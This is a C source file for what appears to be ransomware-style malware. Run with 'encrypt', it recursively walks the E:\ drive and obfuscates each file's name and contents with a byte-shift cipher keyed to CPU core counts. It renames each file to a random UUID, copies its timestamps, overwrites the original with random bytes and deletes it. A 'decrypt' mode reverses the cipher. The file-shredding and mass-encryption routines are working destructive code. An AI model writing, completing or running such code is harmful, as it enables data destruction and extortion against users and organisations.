#include "main.h"

struct FileInfo {
   char name[FILENAME_SIZE];
};

typedef struct pfr_struct {
   int mode;
   char basePath[PATH_SIZE];
   char ext[20];
} pfr_args;

void toLower(char* str);
int dir_exists(const char *path);
int file_exists(const char *filename);
void endeda(int mode, const char* path_old, char* path_new, const char* fname, int key);
void copy_old_time(struct stat* st, const char* path_new);
int randInRange(int min, int max);
char randomByte();
//void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
//void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
char* uuid4();
int getkey();
const char* get_file_ext(const char* fname);
//void copy_file(const char* path_old, const char* path_new);
void processFilesRecursively(int mode, const char* basePath, const char* ext);

const char* exts = ",exe,rar,bat,txt,ps1,";

int main(int argc, char *argv[])
{
	if (argc != 2) return EXIT_SUCCESS;
	
	int mode = 0;
	if (strcmp(argv[1], "encrypt") == 0)
		mode = 1;
	else if (strcmp(argv[1], "decrypt") == 0)
		mode = 2;
	
	srand (time(NULL));
	
	//struct AES_ctx ctx;
	
	argv[0][strlen(argv[0]) - 4] = 0;
	toLower(argv[0]);
	
	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
	strcpy(path, "E:\\");
	processFilesRecursively(mode, path, argv[0]);
	free(path);
	
	return EXIT_SUCCESS;
}

void toLower(char* str)
{
	for(size_t i=0; i<=strlen(str); i++)
	{
      if(str[i]>=65 && str[i]<=90)
         str[i]=str[i]+32;
	}
}

/**
 * Function to check whether a directory exists or not.
 * It returns 1 if given path is directory and  exists 
 * otherwise returns 0.
 */
int dir_exists(const char *path)
{
   struct stat statbuf;
   if (stat(path, &statbuf) != 0)
	   return 0;
   return S_ISDIR(statbuf.st_mode);
}

int file_exists(const char *filename)
{
	struct stat statbuf;
	if (stat(filename, &statbuf) == 0)
		return 1;
	return 0;
}

void endeda(int mode, const char* path_old, char* path_new, const char* fname, int key)
{
	//printf("%s\n", fname);
	
	FILE* fp_old = NULL;
	FILE* fp_new = NULL;
	char buffer[CHUNK_SIZE];
	size_t bytes, i, j;
	
	fp_old = fopen(path_old,"rb");
	if(fp_old != NULL)
	{
		if (mode==2)
		{
			struct FileInfo fi;
			fread(&fi, sizeof(struct FileInfo), 1, fp_old);
			for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
				fi.name[i] = fi.name[i]-key+i;
			strcat(path_new, fi.name);
		}
		
		fp_new = fopen(path_new,"wb");
		if(fp_new != NULL)
		{
			if (mode==1)
			{
				struct FileInfo fi;
				strcpy(fi.name, fname);
				for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
					fi.name[i] = fi.name[i]+key-i;
				fwrite(&fi, sizeof(struct FileInfo), 1, fp_new);
			}
			while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
			{
				j = bytes;
				for(i=0; i<bytes; i++)
				{
					if (mode==2)
					{
						buffer[i]=buffer[i]+key+i-j;
					}
					else
					{
						buffer[i]=buffer[i]-key-i+j;
					}
					j--;
				}
				fwrite(buffer, 1, bytes, fp_new);
			}
		}
		fclose(fp_new);
	}
	fclose(fp_old);
}

void copy_old_time(struct stat* st, const char* path_new)
{
	struct utimbuf newTimeBuf;
	newTimeBuf.actime  = st->st_atime;
	newTimeBuf.modtime = st->st_mtime;
	utime(path_new, &newTimeBuf);
}

int randInRange(int min, int max)
{
	double scale = 1.0 / (RAND_MAX + 1);
	double range = max - min + 1;
	return min + (int) ( rand() * scale * range );
}

char randomByte()
{
	return (char)randInRange(0, 255);
}

void shredder(struct stat* st, const char* path)
{
	int stat = chmod(path, S_IREAD|S_IWRITE);
	if (!stat)
	{
		off_t size;
		FILE* fp = NULL;
		fp = fopen(path, "rb+");
		if(fp != NULL)
		{
			size = st->st_size;
			
			size_t k = sizeof(char) * CHUNK_SIZE;
			
			long long i = 0;
			char byte[CHUNK_SIZE];
			
			/* Set file descriptor to point to the 0-index byte of file. */
			fseek(fp, 0L, SEEK_SET);
			
			//total_byte_size = count_bytes(size);
			for(i = 0; i < size; i += k)
			{
				/* get random data */
				for(size_t j = 0; j < sizeof(byte); j++)
					byte[j] = randomByte();

				/* IF conditional to ensure the program does not over overwrite data. */
				if( (size - i) < CHUNK_SIZE )
					{
						k = sizeof(char) * (size - i);
					}

				/* Writes N(k) bytes to file pointer. */
				fwrite(byte, 0x1, k, fp);
			}
		}
		fclose(fp);
	}
}

/* void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output)
{
	size_t len = strlen(data);
	
	uint8_t* str = (uint8_t*)malloc((len + 1)* sizeof(uint8_t));
	strcpy(str,data);
	
	AES_init_ctx_iv(ctx, (const uint8_t*)key, (const uint8_t*)iv);
	AES_CBC_encrypt_buffer(ctx, str, len);
	
	*output = (char*)malloc(((len * 2) + 1)* sizeof(char));
	char* ptr = &(*output[0]);
	for (int i = 0; i < len; ++i) {
		 ptr += sprintf(ptr, "%02X", str[i]);
	}
	
	free(str);
}

void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output)
{
	size_t len = strlen(data)/2;
	
	uint8_t* str = (uint8_t*)malloc((len + 1)* sizeof(uint8_t));
	size_t i;
    int value;
    for (i = 0; i < len && sscanf(data + i * 2, "%2x", &value) == 1; i++) {
        str[i] = value;
    }
	
	AES_init_ctx_iv(ctx, (const uint8_t*)key, (const uint8_t*)iv);
	AES_CBC_decrypt_buffer(ctx, str, len);
	
	*output = (char*)malloc((len + 1)* sizeof(char));
	strcpy(*output,str);
	
	free(str);
} */

char* uuid4()
{
	UUID4_STATE_T state;
	UUID4_T uuid;

	uuid4_seed(&state);
	uuid4_gen(&state, &uuid);

	char* buffer = (char*)malloc(UUID4_STR_BUFFER_SIZE * sizeof(char));
	
	if (uuid4_to_s(uuid, buffer, UUID4_STR_BUFFER_SIZE))
		return buffer;
	
	return NULL;
}

int getkey()
{
	unsigned int ncores=0,nthreads=0,ht=0;
	asm volatile("cpuid": "=a" (ncores), "=b" (nthreads) : "a" (0xb), "c" (0x1) : );
	ht=(ncores!=nthreads);
	//printf("Cores: %d\nThreads: %d\nHyperThreading: %s\n",ncores,nthreads,ht?"Yes":"No");
	//printf("It's %llu bit system\n", sizeof(void *) * 8);
	return (ncores+nthreads+ht+(sizeof(void *) * 8));
}

const char* get_file_ext(const char* fname)
{
	const char* dot = strrchr(fname, '.');
	if(!dot || dot == fname) return "";
	return dot + 1;
}

/* void copy_file(const char* path_old, const char* path_new)
{
	FILE* fp_old = NULL;
	FILE* fp_new = NULL;
	char buffer[CHUNK_SIZE];
	size_t bytes;
	
	fp_old = fopen(path_old,"rb");
	fp_new = fopen(path_new,"wb");
	if(fp_old != NULL && fp_new != NULL)
	{
		while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
			fwrite(buffer, 1, bytes, fp_new);
	}
	fclose(fp_new);
	fclose(fp_old);
} */

void processFilesRecursively(int mode, const char* basePath, const char* ext)
{
    char path_old[PATH_SIZE];
	char path_new[PATH_SIZE];
    struct dirent* dp;
    DIR* dir = opendir(basePath);
	
    // Unable to open directory stream
    if (!dir)
        return;
	
    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
			// Construct new path from our base path
            strcpy(path_old, basePath);
            strcat(path_old, "\\");
            strcat(path_old, dp->d_name);
			
			strcpy(path_new, basePath);
            strcat(path_new, "\\");
			
			if (dir_exists(path_old))
			{
				processFilesRecursively(mode, path_old, ext);
			}
			else
			{
				if (mode==1)
				{
					/* const char* fext = get_file_ext(dp->d_name);
					int felen = strlen(fext);
					char* fel = (char*)malloc((felen+1) * sizeof(char));
					strcpy(fel,fext);
					toLower(fel);
					char* extret = strstr(exts, fel);
					free(fel);
					if (extret)
					{
						extret--;
						if (extret[0]!=',')
							continue;
						for (int i = 0; i <= felen; ++i)
							extret++;
						if (extret[0]!=',')
							continue;
					}
					else
					{
						continue;
					} */
					
					char* buffer = uuid4();
					strcat(path_new, buffer);
					free(buffer);
					strcat(path_new, ".");
					strcat(path_new, ext);
				}
				
				// Check Path contains extension
				char* ret = strstr(path_old, ext);
				if (mode==1 && ret)
				{
					continue;
				}
				else if (mode==2 && !ret)
				{
					continue;
				}
				
				//endeda(mode, path_old, path_new, dp->d_name, 786);
				endeda(mode, path_old, path_new, dp->d_name, getkey());
				
				//printf("%s\n", dp->d_name);
				//printf("path_old : %s\n", path_old);
				//printf("path_new : %s\n", path_new);
				
				if (file_exists(path_new))
				{
					struct stat oldStat;
					if (stat(path_old, &oldStat) == 0)
					{
						copy_old_time(&oldStat, path_new);
						shredder(&oldStat, path_old);
					}
					if (remove(path_old) != 0)
					{
						int stat = chmod(path_old, S_IREAD|S_IWRITE);
						if (!stat) remove(path_old);
					}
				}
			}
        }
    }

    closedir(dir);
}
